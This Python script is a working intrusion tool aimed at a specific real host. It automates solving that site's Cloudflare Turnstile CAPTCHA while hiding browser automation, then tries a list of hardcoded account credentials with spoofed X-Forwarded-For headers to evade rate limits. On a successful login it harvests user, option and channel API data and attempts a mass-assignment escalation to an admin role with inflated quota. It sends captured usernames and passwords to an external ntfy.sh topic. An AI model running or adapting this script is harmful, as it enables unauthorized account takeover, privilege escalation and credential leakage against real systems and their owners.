#!/usr/bin/env python3
"""WARP-egress Turnstile solver + login probe for 40.160.50.80:3000 (intent 74158).

Based on warp_probe2.py (proven on .37: 16s token via shadow-DOM coord click).
Targeted at .80's OWN sitekey, then logs in with confirmed DB-persisted .80 accounts,
then harvests /api/user/self, /api/option/, /api/deployments and mass-assignment test.
"""
import json, os, sys, time, re, random
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

TARGET = os.environ.get("TARGET", "http://40.160.50.80:3000")
HOST = urlparse(TARGET).hostname
SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGA1XSFhsC_wKQEx")
PROXY = os.environ.get("PROXY", "")
BUDGET = int(os.environ.get("BUDGET", "240"))
NT = os.environ.get("NT", "")

MINI = """<!doctype html><html><head><meta charset="utf-8"><title>Sign In</title>
<style>body{font-family:system-ui;margin:40px}#c{margin-top:10px;width:320px;height:80px}</style></head>
<body><h1>Sign In</h1><div id="c"></div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=cb_onload"></script>
<script>
window.__tok=""; window.__err=""; window.__log=[];
function mk(wid, opts){
  var o = {sitekey:"%s", theme:"light", size:"normal",
    callback:function(t){window.__tok=t; document.title="TOK:"+t.length; window.__log.push("cb:"+t.length+":"+wid);},
    "error-callback":function(e){window.__err="cb:"+e; window.__log.push("err:"+e+":"+wid);},
    "expired-callback":function(){window.__log.push("expired:"+wid);},
    "timeout-callback":function(){window.__err="timeout"; window.__log.push("timeout:"+wid);}};
  for(var k in opts) o[k]=opts[k];
  try { var w = turnstile.render(wid, o); window.__log.push("rendered:"+w); return w; }
  catch(e){ window.__log.push("render:"+e); return null; }
}
function cb_onload(){
  window.__log.push("onload");
  window.__wid = mk("#c", {});
}
</script></body></html>""" % SITEKEY

# .80 accounts confirmed DB-persisted (fact#50897): hr_animation_test role=5 (revival point),
# pat-yibu-sub1..7 role=1.
CREDS = [
    ("hr_animation_test", "HrNew440!"),
    ("pat-yibu-sub1", "pat-yibu-sub1"),
    ("pat-yibu-sub2", "pat-yibu-sub2"),
    ("pat-yibu-sub3", "pat-yibu-sub3"),
    ("pat-yibu-sub4", "pat-yibu-sub4"),
    ("pat-yibu-sub5", "pat-yibu-sub5"),
    ("pat-yibu-sub6", "pat-yibu-sub6"),
    ("pat-yibu-sub7", "pat-yibu-sub7"),
]


def log(*a):
    print("[p]", *a, flush=True)


def ntfy(msg):
    if not NT:
        return
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/%s" % NT, data=msg.encode()[:3500],
            headers={"Title": "i74158"}), timeout=10)
    except Exception as e:
        log("ntfy err", str(e)[:80])


READ_JS = """() => {
    let t = '';
    try { t = window.__tok || ''; } catch(e){}
    if (!t && window.turnstile) {
        try { t = window.turnstile.getResponse ? (window.turnstile.getResponse(window.__wid) || '') : ''; } catch(e){}
    }
    const out = {tok: t, url: location.href, title: document.title, log: []};
    try { out.log = (window.__log||[]).slice(-14); } catch(e){}
    try {
      var host = document.querySelector('#c > div > div') || document.querySelector('#c > div');
      out.host = host ? host.tagName : null;
      out.shadow = !!(host && host.shadowRoot);
      out.cRect = (function(){var r=document.querySelector('#c').getBoundingClientRect();
                    return {x:r.x,y:r.y,w:r.width,h:r.height};})();
      out.iframes = [];
      document.querySelectorAll('iframe').forEach(function(f,i){
        out.iframes.push({i:i, src:(f.src||'').slice(0,120), w:f.clientWidth, h:f.clientHeight});
      });
    } catch(e){ out.derr = ''+e; }
    return out;
}"""


def connectivity_timeline(n=1, gap=4):
    import httpx
    kw = dict(timeout=25.0, verify=False, follow_redirects=False)
    if PROXY:
        kw["proxy"] = PROXY
    out = []
    with httpx.Client(**kw) as c:
        for i in range(n):
            row = {"i": i, "ts": time.strftime("%H:%M:%S")}
            for name, url in (("target", TARGET + "/api/status"),
                              ("brunhild_path", "https://brunhild.challenges.cloudflare.com/cdn-cgi/challenge-platform/")):
                t0 = time.time()
                try:
                    r = c.get(url)
                    row[name] = {"status": r.status_code, "len": len(r.content),
                                 "elapsed": round(time.time() - t0, 2)}
                except Exception as e:
                    row[name] = {"err": str(e)[:100], "elapsed": round(time.time() - t0, 2)}
            log("CONN", json.dumps(row)[:300])
            out.append(row)
            if i < n - 1:
                time.sleep(gap)
    return out


def solve_once(p, results):
    args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--disable-features=HttpsUpgrades,HttpsFirstBalancedModeAutoEnable,HttpsFirstModeV2",
            "--lang=en-US", "--window-size=1280,900"]
    kw = dict(channel="chrome", headless=False, args=args)
    if PROXY:
        kw["proxy"] = {"server": PROXY}
    browser = p.chromium.launch(**kw)
    ctx = browser.new_context(locale="en-US", timezone_id="America/New_York",
                              viewport={"width": 1280, "height": 900}, ignore_https_errors=True)
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
    page = ctx.new_page()
    console, responses, reqfail = [], [], []
    page.on("console", lambda m: console.append({"type": m.type, "text": m.text[:250]}) if len(console) < 300 else None)

    def on_response(r):
        try:
            u = r.url
            if "cloudflare.com" in u and ("/fo/" in u or "/ci/" in u or "turnstile/f/" in u) and len(responses) < 60:
                body = ""
                try:
                    body = r.text()[:300]
                except Exception:
                    pass
                responses.append({"url": u[:150], "status": r.status, "body": body})
        except Exception:
            pass
    page.on("response", on_response)
    page.on("requestfailed", lambda r: reqfail.append("%s %s" % (r.url[:100], r.failure)) if len(reqfail) < 30 else None)

    def route(r):
        h = urlparse(r.request.url).hostname or ""
        if h == HOST:
            if r.request.resource_type == "document":
                r.fulfill(status=200, content_type="text/html; charset=utf-8", body=MINI)
            else:
                r.continue_()
        elif "cloudflare.com" in h:
            r.continue_()
        else:
            r.abort()

    page.route("**/*", route)
    t0 = time.time()
    try:
        page.goto(TARGET + "/sign-in", wait_until="commit", timeout=60000)
    except Exception as e:
        log("goto err", str(e)[:120])

    snaps, tok, clicks = [], "", []
    deadline = time.time() + BUDGET
    last_snap = last_click = 0
    phase = 1
    while time.time() < deadline:
        st = None
        try:
            st = page.evaluate(READ_JS)
        except Exception as e:
            log("eval err", str(e)[:80])
        if st:
            tok = st.get("tok") or ""
            if tok:
                snaps.append({"t": round(time.time() - t0, 1), "tok_len": len(tok)})
                break
            if time.time() - last_snap >= 12:
                last_snap = time.time()
                snaps.append({"t": round(time.time() - t0, 1), "state": st})
                log("SNAP", json.dumps(st)[:900])
        if time.time() - t0 > 5 and time.time() - last_click > 7 and len(clicks) < 10:
            try:
                r = page.evaluate("() => {var r=document.querySelector('#c').getBoundingClientRect();return {x:r.x,y:r.y,w:r.width,h:r.height};}")
                if r and r.get("w", 0) > 4:
                    for dx in (28, 150):
                        page.mouse.move(r["x"] + dx, r["y"] + r["h"] / 2)
                        page.mouse.down(); time.sleep(0.08); page.mouse.up()
                        time.sleep(0.35)
                    clicks.append({"t": round(time.time() - t0, 1), "rect": r})
                    last_click = time.time()
                    log("CLICK", json.dumps(clicks[-1]))
                    page.screenshot(path="shot_%d.png" % len(clicks))
            except Exception as e:
                log("click err", str(e)[:90])
        if phase == 1 and time.time() - t0 > 80 and not tok:
            phase = 2
            try:
                page.evaluate("""() => {
                    try { var d=document.createElement('div'); d.id='c2'; d.style.marginTop='20px';
                          document.body.appendChild(d);
                          if(window.turnstile && window.__wid){ try{turnstile.remove(window.__wid);}catch(e){} }
                          window.__wid = mk('#c2', {appearance:'always'}); } catch(e){ window.__log.push('p2:'+e); }
                }""")
                log("PHASE2 fresh widget appearance=always")
            except Exception as e:
                log("phase2 err", str(e)[:90])
        time.sleep(1.2)

    info = {"token_len": len(tok), "page_url": page.url,
            "elapsed": round(time.time() - t0, 1), "clicks": clicks,
            "snapshots": snaps[-6:], "console": console[-40:],
            "cf_bodies": responses[-12:], "reqfail": reqfail[-10:]}
    try:
        info["err"] = page.evaluate("window.__err || ''")
        info["page_log"] = page.evaluate("window.__log || []")
    except Exception:
        pass
    results["solve"] = info
    results["token"] = tok
    log("SOLVE", json.dumps({k: v for k, v in info.items() if k != "snapshots"})[:2500])
    try:
        page.screenshot(path="last_probe80.png")
        page.content()
        open("last_probe80.html", "w").write(page.content())
    except Exception:
        pass
    return browser, ctx, page, tok


def rand_ip():
    return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                            random.randint(0, 255), random.randint(1, 254))


def http_client():
    import httpx
    kw = dict(timeout=40.0, verify=False, follow_redirects=True,
              headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36",
                       "Accept": "application/json", "Content-Type": "application/json"})
    if PROXY:
        kw["proxy"] = PROXY
    return httpx.Client(**kw)


def do_login(tok, results):
    c = http_client()
    attempts = []
    try:
        for u, pw in CREDS:
            xff = rand_ip()
            try:
                r = c.post(TARGET + "/api/user/login?turnstile=" + tok,
                           json={"username": u, "password": pw}, timeout=40,
                           headers={"X-Forwarded-For": xff, "X-Real-IP": xff})
                st, body = r.status_code, r.text[:800]
                setck = r.headers.get("set-cookie", "")[:200]
            except Exception as e:
                st, body, setck = -1, str(e)[:200], ""
            attempts.append({"u": u, "status": st, "body": body[:300], "setc": setck})
            log("LOGIN", u, st, body[:220].replace("\n", " "))
            if st == 200 and '"success":true' in body:
                log("!!! LOGIN SUCCESS", u)
                results["login"] = {"username": u, "password": pw, "resp": body, "setc": setck}
                return c, results["login"]
            if "频繁" in body or "too many" in body.lower():
                results["rate_limited"] = u
                time.sleep(20)
            time.sleep(3)
    finally:
        results["attempts"] = attempts
    return c, None


def harvest(c, login_body, results):
    uid = ""
    m = re.search(r'"id":(\d+)', login_body or "")
    if m:
        uid = m.group(1)
    role = ""
    mr = re.search(r'"role":(\d+)', login_body or "")
    if mr:
        role = mr.group(1)
    headers = {"New-API-User": uid}
    out = {}
    # first: /api/user/self
    for path in ["/api/user/self", "/api/user/?p=0&page_size=20", "/api/option/",
                 "/api/deployments/settings", "/api/channel/?p=0&page_size=20"]:
        try:
            r = c.get(TARGET + path, headers=headers, timeout=40)
            out[path] = {"status": r.status_code, "body": r.text[:3000]}
            log("HARVEST", path, r.status_code, r.text[:200].replace("\n", " "))
        except Exception as e:
            out[path] = {"err": str(e)[:100]}
        time.sleep(0.8)
    results["harvest"] = out
    results["uid"] = uid
    results["role"] = role

    # mass-assignment privilege escalation attempt on /api/user/self (role=100)
    ma = {}
    try:
        r = c.put(TARGET + "/api/user/self", headers=headers, timeout=40, json={
            "username": "", "display_name": "", "role": 100, "status": 1,
            "is_master_account": True, "group": "default", "quota": 1000000000
        })
        ma["PUT_self"] = {"status": r.status_code, "body": r.text[:800]}
        log("MA_PUT", r.status_code, r.text[:300].replace("\n", " "))
    except Exception as e:
        ma["PUT_self"] = {"err": str(e)[:100]}
    time.sleep(0.8)
    try:
        r = c.get(TARGET + "/api/user/self", headers=headers, timeout=40)
        ma["verify_self"] = {"status": r.status_code, "body": r.text[:800]}
        log("MA_VERIFY", r.status_code, r.text[:300].replace("\n", " "))
    except Exception as e:
        ma["verify_self"] = {"err": str(e)[:100]}
    results["massassign"] = ma


def main():
    results = {"target": TARGET, "sitekey": SITEKEY, "ts": time.strftime("%F %T"),
               "proxy": PROXY, "budget": BUDGET, "v": "80a"}
    results["conn_timeline"] = connectivity_timeline(1, 4)
    with sync_playwright() as p:
        b, ctx, page, tok = solve_once(p, results)
        if tok:
            results["token_prefix"] = tok[:40] + "..."
            results["token_full"] = tok
            c, login = do_login(tok, results)
            if login:
                ntfy("i74158 LOGIN_SUCCESS user=%s pass=%s" % (login["username"], login["password"]))
                harvest(c, login["resp"], results)
            else:
                ntfy("i74158 WARP token_ok but no credential hit")
            try:
                c.close()
            except Exception:
                pass
        else:
            ntfy("i74158 WARP NO_TOKEN clicked=%d err=%s" % (len(results["solve"].get("clicks") or []), results["solve"].get("err")))
        try:
            ctx.close(); b.close()
        except Exception:
            pass
    json.dump(results, open("results_probe80.json", "w"), indent=1)
    print("RESULTS_JSON " + json.dumps({k: v for k, v in results.items() if k not in ("token_prefix", "token_full")})[:2500], flush=True)


if __name__ == "__main__":
    main()